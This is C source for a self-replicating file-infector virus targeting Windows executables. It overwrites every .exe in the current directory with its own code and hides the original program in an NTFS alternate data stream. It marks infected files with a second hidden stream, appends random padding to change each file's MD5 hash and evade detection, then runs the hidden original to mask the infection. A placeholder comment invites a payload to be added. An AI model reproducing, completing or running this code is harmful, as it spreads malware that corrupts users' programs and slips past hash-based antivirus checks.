#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <time.h>

int infectFile(char *file, char *current){
	char prompt[2000];
	int random_num,i;
	char *r_string = (char *)malloc(1000);
	//Check if file is infected 
	if(!strcmpi("virus.exe",file)){
		return 0;
	}
	if(isInfected(file)){
		return 0;		
	}
	
	//Make a copy of the virus.	
	sprintf(prompt,"cmd /c \"copy %s temp.exe > asdf.txt\"",file);
	system(prompt);
	sprintf(prompt,"cmd /c \"copy %s.exe %s > asdf.txt\"",current,file);
	system(prompt);
	sprintf(prompt,"cmd /c \"type temp.exe > %s:original.exe\"",file);
	system(prompt);
	system("cmd /c \"del temp.exe\"");
	system("cmd /c \"del asdf.txt\"");
	
	//Randomize the MD5 hash
	random_num = rand() % 1000;
	memset(r_string,0,strlen(r_string));
	for(i=0;i<random_num;++i){
		strcat(r_string,"A");
	}
	sprintf(prompt,"cmd /c \"echo %S>> %s\"",r_string,file);
	system(prompt);

	//Add an ADS to indicate the file has been infected.
	sprintf(prompt,"cmd /c \"echo infected> C:\\cygwin\\tmp\\asdf.txt\"");
	system(prompt);
	sprintf(prompt,"cmd /c \"type C:\\cygwin\\tmp\\asdf.txt > %s:infected.txt\"",file);
	system(prompt);
	system("cmd /c \"del C:\\cygwin\\tmp\\asdf.txt\"");
	free(r_string);
	return 1;
}

int isInfected(char* file){
	char prompt[200];
	char content[200];
	FILE *fp;
	sprintf(prompt,"cmd /c \"more < %s:infected.txt\" > /tmp/asdf.txt 2>&1 ",file);
	system(prompt);
	fp = fopen("/tmp/asdf.txt","r");
	if(fp == NULL){
		return 0;
	}
	fgets(content,200,fp);
	fclose(fp);
	system("cmd /c \"del C:\\cygwin\\tmp\\asdf.txt\"");
	if(!strcmp(content,"infected\r\n")){
		return 1;
	}
	else{
		return 0;
	}
}

int main(int argc, char **argv){
	DIR *d;
	time_t t;
	char *filename, *current = &argv[0][2];;
	char prompt[200];
	int name_size, i,j,done;
	char extension[5];
	struct dirent *dir;
	d = opendir(".");
	extension[4] = '\0';
	if(d){
		srand((unsigned)time(&t));
		while((dir = readdir(d)) != NULL){
			filename = dir->d_name;
			name_size = strlen(filename);
			if(name_size > 4){
				j=1;
				for(i=3;i>=0;--i){
					extension[i] = filename[name_size-j];
					j++;	
				}
				if(!strcmpi(".exe",extension)){
					if(infectFile(filename,current)){
						//printf("infected %s\n",filename);
					}
					else{
						//printf("%s is already infected\n",filename);	
					}
				}
			}
		}
		close(d);
	}
	
	//Insert payload here
	printf("Files are infected and payload is executing\n");
	//Execute orignal program if this is not the originating virus.
	if(strcmpi("virus",current)){
		sprintf(prompt,"cmd /c \"start ./%s.exe:original.exe\"",current);
		system(prompt);	
	}
	return 0;
}
